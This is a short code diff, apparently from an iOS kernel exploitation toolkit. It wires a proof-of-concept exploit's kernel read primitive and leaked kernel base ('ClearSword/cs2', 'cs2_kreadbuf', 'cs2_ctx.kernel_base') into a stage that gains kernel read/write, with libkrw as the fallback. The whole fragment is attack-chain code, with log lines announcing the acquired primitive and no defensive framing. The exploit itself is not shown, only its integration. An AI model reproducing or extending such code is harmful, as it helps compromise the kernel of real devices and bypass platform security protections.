@@ -68,6 +68,15 @@ static int p090_kb_cs2(uint64_t *out) { *out = Lum1naCS2Core_Kbase(); return *ou
 static int g_p090_fd = -1;
 static NSMutableString *g_p090_buf;
 
+// ---- v2 rig provider: the ARM's OWN live context (same-boot law). The rig
+// tree carries the core under ClearSword/cs2/ — after a passing CS2Runner
+// fire this boot, cs2_ctx.kernel_base is the kbase and cs2_kreadbuf is the
+// reader. (cs2_kreadbuf: 0=success — the inverted-BOOL trap, twice-learned.) ----
+#include "ClearSword/cs2/poc.h"
+#include "ClearSword/cs2/krw.h"
+static int p090_rd_arm(uint64_t a, void *b, size_t n) { return (cs2_kreadbuf(a, b, n) == 0) ? 0 : -1; }
+static int p090_kb_arm(uint64_t *out) { *out = cs2_ctx.kernel_base; return *out ? 0 : -1; }
+
 static void p090_log(NSString *fmt, ...) {
     va_list ap;
     va_start(ap, fmt);
@@ -154,6 +163,13 @@ static BOOL p090_looks_kernel(uint64_t v) {
         p090_log(@"[+] krw via cs2core (in-process — the mini-proven route)");
     }
 #endif
+    /* v2c: the ARM's own live ctx (same-boot law) — after a passing CS2Runner
+       fire this boot, cs2_ctx is the provider (23:03 mini run's path). */
+    if (!f_kread && cs2_ctx.kernel_base != 0) {
+        f_kbase = p090_kb_arm;
+        f_kread = p090_rd_arm;
+        p090_log(@"[+] krw via the cs2 ARM ctx (same-boot: kernel_base=0x%llx)", cs2_ctx.kernel_base);
+    }
     if (!f_kread) {
     p090_log(@"[*] Step 2: libkrw glue.");
     const char *candidates[] = {
